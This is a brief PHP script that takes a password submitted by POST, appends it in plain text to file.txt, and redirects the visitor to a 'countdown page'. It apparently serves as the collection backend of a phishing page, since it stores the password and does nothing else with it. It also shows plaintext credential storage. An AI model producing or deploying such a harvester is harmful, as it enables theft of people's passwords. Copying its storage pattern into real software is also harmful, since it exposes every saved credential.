<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['password'])) {
    $password = htmlspecialchars($_POST['password']);
    $file = 'file.txt';

    // Check if the file is writable
    if (is_writable($file)) {
        if (file_put_contents($file, $password . PHP_EOL, FILE_APPEND) !== false) {
            // Redirect to the countdown page after saving the password
            header('Location: redirect.html');
            exit;
        } else {
            echo "Error: Unable to write to the file.";
        }
    } else {
        echo "Error: File is not writable. Please check file permissions.";
    }
} else {
    echo "Invalid request.";
}
?>
